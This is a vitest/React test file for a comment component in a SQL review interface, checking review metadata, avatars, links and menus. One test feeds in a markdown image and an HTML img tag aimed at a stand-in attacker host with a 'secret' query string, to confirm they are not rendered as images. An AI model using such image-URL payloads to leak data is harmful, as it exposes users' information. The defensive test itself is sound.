import { create } from "@bufbuild/protobuf";
import { timestampFromMs } from "@bufbuild/protobuf/wkt";
import { cleanup, fireEvent, render, within } from "@testing-library/react";
import type { ReactElement, ReactNode } from "react";
import { afterEach, describe, expect, test, vi } from "vitest";
import {
  IssueComment_ReviewMetadata_Priority,
  IssueComment_ReviewMetadataSchema,
  IssueComment_ThreadState,
  IssueCommentSchema,
  StatementAnchorSchema,
} from "@/types/proto-es/v1/issue_service_pb";
import {
  Plan_ChangeDatabaseConfigSchema,
  Plan_SpecSchema,
} from "@/types/proto-es/v1/plan_service_pb";
import type { Project } from "@/types/proto-es/v1/project_service_pb";
import { ReviewRuleType } from "@/types/proto-es/v1/review_rule_pb";

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: () => {} },
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("@/components/HumanizeTs", async () => ({
  ...(await import("@/test-utils/humanizeTs")).humanizeTsStub(),
}));

const mocks = vi.hoisted(() => ({ canEdit: false }));

// The activity module drags Monaco into the test; only the edit rule matters.
vi.mock("@/components/issue-activity/IssueCommentActivity", () => ({
  canEditIssueComment: () => mocks.canEdit,
}));

vi.mock("@/app/router", () => ({
  router: {
    push: vi.fn(),
    resolve: () => ({ href: "/projects/p/plans/9" }),
  },
}));

vi.mock("../../shell/PlanDetailContext", () => ({
  usePlanDetailContext: () => ({
    bypassLeaveGuardOnce: vi.fn(),
    isEditing: false,
    planId: "9",
    projectId: "p",
  }),
}));

// The menu's parts are laid out in place, so a test reads what it holds.
vi.mock("@/components/ui/dropdown-menu", () => ({
  DropdownMenu: ({ children }: { children: ReactNode }) => <>{children}</>,
  DropdownMenuContent: ({ children }: { children: ReactNode }) => (
    <div role="menu">{children}</div>
  ),
  DropdownMenuItem: ({
    children,
    onClick,
  }: {
    children: ReactNode;
    onClick?: () => void;
  }) => (
    <button onClick={onClick} role="menuitem" type="button">
      {children}
    </button>
  ),
  DropdownMenuTrigger: ({ render }: { render: ReactElement }) => render,
}));

vi.mock("@/hooks/useAppState", () => ({
  usePlanFeature: () => false,
  useUserByIdentifier: (principal: string | undefined) =>
    principal
      ? {
          name: principal,
          email: principal.replace(/^users\//, ""),
          title: "Alice",
        }
      : undefined,
}));

vi.mock("@/stores/app", () => {
  const state = {
    batchGetOrFetchDatabases: vi.fn(async () => []),
    databasesByName: {},
    dbGroupsByName: {},
    dbGroupViewByName: {},
    environmentList: [],
  };
  const useAppStore = (selector: (s: typeof state) => unknown) =>
    selector(state);
  useAppStore.getState = () => state;
  return { useAppStore };
});

vi.mock("../PlanTargetDisplay", () => ({
  PlanTargetDisplay: ({ target }: { target: string }) => (
    <span data-testid="target">{target}</span>
  ),
}));

import {
  ActivityScope,
  CommentLinkProvider,
} from "../../shell/CommentLinkContext";
import { ThreadComment } from "./ThreadComment";

afterEach(() => {
  cleanup();
  mocks.canEdit = false;
});

const ISSUE = "projects/p/issues/1";
const project = { name: "projects/p" } as Project;
const TARGETS = [
  "instances/prod/databases/app",
  "instances/prod/databases/billing",
];

const userComment = (text: string) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/1`,
    comment: text,
    creator: "users/alice@example.com",
    createTime: timestampFromMs(1_000),
    updateTime: timestampFromMs(1_000),
    threadState: IssueComment_ThreadState.OPEN,
  });

const reviewResult = (
  text: string,
  ruleType = ReviewRuleType.REVIEW_RULE_TYPE_UNSPECIFIED,
  priority = IssueComment_ReviewMetadata_Priority.P0
) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/2`,
    comment: text,
    createTime: timestampFromMs(1_000),
    updateTime: timestampFromMs(1_000),
    threadState: IssueComment_ThreadState.OPEN,
    reviewMetadata: create(IssueComment_ReviewMetadataSchema, {
      ruleType,
      priority,
      targets: TARGETS,
    }),
  });

const renderComment = (comment: ReturnType<typeof userComment>) =>
  render(
    <ThreadComment comment={comment} onEdit={vi.fn()} project={project} />
  );

const specOf = (id: string) =>
  create(Plan_SpecSchema, {
    id,
    config: {
      case: "changeDatabaseConfig",
      value: create(Plan_ChangeDatabaseConfigSchema, {
        sheet: "projects/p/sheets/abc",
        targets: [...TARGETS].reverse(),
      }),
    },
  });

describe("ThreadComment", () => {
  test.each([
    { anchoredTo: "spec-1", shown: false },
    { anchoredTo: "spec-2", shown: true },
  ])(
    "uses the spec's databases only for a result anchored to it: anchored to $anchoredTo, targets shown=$shown",
    ({ anchoredTo, shown }) => {
      const comment = reviewResult("Missing WHERE clause.");
      comment.statementAnchor = create(StatementAnchorSchema, {
        spec: anchoredTo,
      });
      const { container } = render(
        <ThreadComment
          comment={comment}
          onEdit={vi.fn()}
          project={project}
          spec={specOf("spec-1")}
        />
      );
      expect(
        container.querySelector("[data-testid='review-targets']") !== null
      ).toBe(shown);
    }
  );

  test.each([
    {
      ruleType: ReviewRuleType.REVIEW_RULE_TYPE_UNSPECIFIED,
      priority: IssueComment_ReviewMetadata_Priority.P0,
      label: "P0",
    },
    {
      ruleType: ReviewRuleType.REQUIRE_WHERE,
      priority: IssueComment_ReviewMetadata_Priority.P1,
      label: "P1",
    },
  ])(
    "shows a $label review result as the one review, then its databases, then its priority",
    ({ ruleType, priority, label }) => {
      const reviewer = "sql-review.reviewer";
      const { container, getByTestId } = renderComment(
        reviewResult("Missing WHERE clause.", ruleType, priority)
      );
      const content = getByTestId("comment-content");
      const header = content.firstElementChild as HTMLElement;

      expect(within(header).getByTitle(reviewer).textContent).toBe(reviewer);
      expect(
        within(getByTestId("comment-avatar")).getByTestId("reviewer-avatar")
      ).toBeDefined();
      expect(within(header).queryByTestId("review-priority")).toBeNull();
      expect(
        Array.from(content.children)
          .slice(1, 3)
          .map((node) => node.getAttribute("data-testid"))
      ).toEqual(["review-targets", "review-heading"]);
      expect(
        within(getByTestId("review-heading")).getByTestId("review-priority")
          .textContent
      ).toBe(label);
      expect(
        Array.from(container.querySelectorAll("[data-testid='target']")).map(
          (node) => node.textContent
        )
      ).toEqual(TARGETS);
      expect(container.textContent).not.toContain("common.unknown");
      expect(container.textContent).not.toContain("Unknown");
    }
  );

  test("names the standard rule and codes of a rule result, and no rule for any other", () => {
    const rule = reviewResult(
      "DELETE FROM employee has no WHERE clause",
      ReviewRuleType.REQUIRE_WHERE,
      IssueComment_ReviewMetadata_Priority.P1
    );
    if (rule.reviewMetadata) {
      rule.reviewMetadata.codes = ["WH101"];
    }
    const { getByTestId } = renderComment(rule);
    const heading = getByTestId("review-heading");
    expect(within(heading).getByTestId("review-rule").textContent).toBe(
      "sql-review.standard-rules.rule.require-where.title"
    );
    expect(within(heading).getByTestId("review-code").textContent).toBe("WH101");
    cleanup();

    const { container } = renderComment(reviewResult("Missing WHERE clause."));
    expect(container.querySelector("[data-testid='review-rule']")).toBeNull();
  });

  test.each([
    { kind: "comment", make: () => userComment("Looks good") },
    { kind: "review result", make: () => reviewResult("Missing WHERE clause.") },
  ])("sets a $kind's avatar in a column of its own, beside every row of its text", ({ make }) => {
    const { getByTestId } = renderComment(make());
    const avatar = getByTestId("comment-avatar");
    const content = getByTestId("comment-content");
    expect(avatar.nextElementSibling).toBe(content);
    expect(avatar.className).toContain("w-5");
    expect(content.contains(avatar)).toBe(false);
    expect(content.querySelector("[data-testid='reviewer-avatar']")).toBeNull();
  });

  test("shows a user comment as its author with no review details", () => {
    const { container, getByTitle } = renderComment(
      userComment("Looks good ![screenshot](https://example.com/s.png)")
    );

    expect(getByTitle("Alice").textContent).toBe("Alice");
    expect(container.querySelector("[data-testid='reviewer-avatar']")).toBeNull();
    expect(container.querySelector("[data-testid='review-priority']")).toBeNull();
    expect(container.querySelector("[data-testid='review-targets']")).toBeNull();
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "https://example.com/s.png"
    );
  });

  test("renders a review result's markdown and HTML images as a link and text, not as images", () => {
    const { container } = renderComment(
      reviewResult(
        'Drop risk\n\n![chart](https://attacker.example/leak.png?q=secret)\n\n<img src="https://attacker.example/raw.png">'
      )
    );

    expect(container.querySelector("img")).toBeNull();
    expect(
      container.querySelector("a[href='https://attacker.example/leak.png?q=secret']")
        ?.textContent
    ).toBe("chart");
    expect(container.textContent).not.toContain("!chart");
    expect(container.textContent).toContain(
      '<img src="https://attacker.example/raw.png">'
    );
  });
});

describe("a comment's address", () => {
  const NAME = `${ISSUE}/issueComments/1`;
  const onPlanPage = (ui: ReactNode, linked?: string) => (
    <CommentLinkProvider linkedCommentName={linked}>{ui}</CommentLinkProvider>
  );
  const commentUi = (
    <ThreadComment
      comment={userComment("Looks risky.")}
      onEdit={vi.fn()}
      project={project}
    />
  );
  const menuItems = (container: HTMLElement) =>
    Array.from(container.querySelectorAll('[role="menuitem"]')).map(
      (item) => item.textContent
    );

  test("its timestamp is a link whose href is the fragment alone", () => {
    const { getByTestId } = render(onPlanPage(commentUi));
    const timestamp = getByTestId("humanize-ts");
    expect(timestamp.tagName).toBe("A");
    expect(timestamp.getAttribute("href")).toBe("#issueComments/1");
  });

  test("its actions are one menu, with Copy link and no Edit for a reader who may not edit", () => {
    const { container } = render(onPlanPage(commentUi));
    expect(
      container.querySelectorAll(
        'button[aria-label="plan.review.thread.comment-actions"]'
      )
    ).toHaveLength(1);
    expect(menuItems(container)).toEqual(["common.copy-link"]);
    expect(container.querySelector('button[aria-label="common.edit"]')).toBeNull();
  });

  test("Edit is in the menu for a reader who may edit, and opens the editor", () => {
    mocks.canEdit = true;
    const { container, getByText, queryByText } = render(onPlanPage(commentUi));
    expect(menuItems(container)).toEqual(["common.copy-link", "common.edit"]);
    expect(queryByText("common.save")).toBeNull();
    fireEvent.click(getByText("common.edit"));
    expect(getByText("common.save")).toBeTruthy();
    // The menu leaves while the comment is being edited.
    expect(menuItems(container)).toEqual([]);
  });

  test("outside a plan page it has no link and no menu", () => {
    const { container, getByTestId } = render(commentUi);
    expect(getByTestId("humanize-ts").tagName).toBe("SPAN");
    expect(container.querySelector('[role="menu"]')).toBeNull();
  });

  test("is outlined and marked current in Activity when the address names it", () => {
    const { getByTestId } = render(
      onPlanPage(
        <ActivityScope focus={undefined} onLanded={vi.fn()}>
          {commentUi}
        </ActivityScope>,
        NAME
      )
    );
    const comment = getByTestId("thread-comment");
    expect(comment.getAttribute("aria-current")).toBe("true");
    expect(comment.className).toContain("before:border-accent");
    expect(comment.className).toContain("before:inset-1");
    // Over the line that joins the replies to the first comment.
    expect(comment.className).toContain("before:z-1");
  });

  test("is not outlined in the statement editor, which draws the same comment", () => {
    const { getByTestId } = render(onPlanPage(commentUi, NAME));
    const comment = getByTestId("thread-comment");
    expect(comment.hasAttribute("aria-current")).toBe(false);
    expect(comment.className).not.toContain("before:border-accent");
  });

  test("another comment is not outlined", () => {
    const { getByTestId } = render(
      onPlanPage(
        <ActivityScope focus={undefined} onLanded={vi.fn()}>
          {commentUi}
        </ActivityScope>,
        `${ISSUE}/issueComments/other`
      )
    );
    expect(getByTestId("thread-comment").hasAttribute("aria-current")).toBe(
      false
    );
  });
});
